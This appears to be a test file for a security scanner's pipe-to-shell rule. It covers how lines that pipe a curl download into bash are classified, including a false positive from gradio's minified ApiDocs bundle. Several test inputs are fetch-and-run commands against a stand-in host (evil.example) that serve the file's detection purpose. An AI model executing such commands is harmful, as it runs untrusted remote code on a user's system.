"""Pipe-to-shell reads the command that feeds the pipe (gradio 6.31.0, DNC 35).

gradio's minified ApiDocs bundle holds two copy-paste snippets on one line:
`curl --version` and, later, `curl -LsSf https://hf.co/cli/install.sh | bash`. The rule's
match ran from the first curl to the second snippet's `| bash`, so the hf installer
read as an unknown critical. In shell, `a; b | bash` pipes only `b`: a match that
crosses a command separator (`;`, `&&`) is read from the curl / wget after it. With no
separator, e.g. two literals joined into one command, the read stays conservative."""
from __future__ import annotations

from src.scanner import patterns
from src.scanner import pipe_shell as ps


def _pattern():
    import re
    for v in vars(patterns).values():
        if isinstance(v, (list, tuple)):
            for item in v:
                if isinstance(item, tuple) and item and item[0] == ps.PIPE_TO_SHELL:
                    return next(x for x in item if isinstance(x, re.Pattern))
    raise AssertionError("pipe-to-shell pattern not found")


P = _pattern()
JS = "gradio/templates/frontend/assets/ApiDocs-DIr1Sgyo.js"

GRADIO = ("$(z(r),{code:`curl --version`}),y(r);var i=R(r,2),o=z(i);"
          "o.textContent=`$ curl --version`,y(i),y(n),a(e,n)},p=e=>{var t=ke(),n=S(t);"
          "$(z(r),{code:`curl -LsSf https://hf.co/cli/install.sh | bash`}),y(r);")


def test_gradio_snippets_read_as_the_official_installer():
    assert ps.classify_line(GRADIO, P, JS) == ps.OFFICIAL


def test_separator_then_unknown_installer_is_still_critical():
    line = "`curl --version`;x=1;`curl -fsSL https://evil.example/i.sh | bash`"
    assert ps.classify_line(line, P, JS) == ps.CRITICAL


def test_joined_literals_without_a_separator_stay_critical():
    # `curl https://evil` + ` curl https://hf.co/... | bash` is ONE command in shell:
    # curl fetches both URLs and bash runs both.
    line = "s=`curl https://evil.example/x.sh `+`curl -LsSf https://hf.co/cli/install.sh | bash`"
    assert ps.classify_line(line, P, JS) == ps.CRITICAL


def test_and_and_separator_pipes_only_the_last_command():
    line = "curl -fsSL https://evil.example/x.sh -o /dev/null && " \
           "curl -LsSf https://hf.co/cli/install.sh | bash"
    assert ps.classify_line(line, P, "install.sh") == ps.OFFICIAL


def test_no_curl_after_the_separator_keeps_the_original_read():
    line = "curl https://evil.example/x.sh; cat | bash"
    assert ps._last_command_start(line, 0, len(line)) == 0
    assert ps.classify_line(line, P, "run.sh") == ps.CRITICAL


def test_plain_match_unchanged():
    line = "curl -fsSL https://evil.example/i.sh | bash"
    assert ps._last_command_start(line, 0, len(line)) == 0
    assert ps.classify_line(line, P, "README.md") == ps.CRITICAL
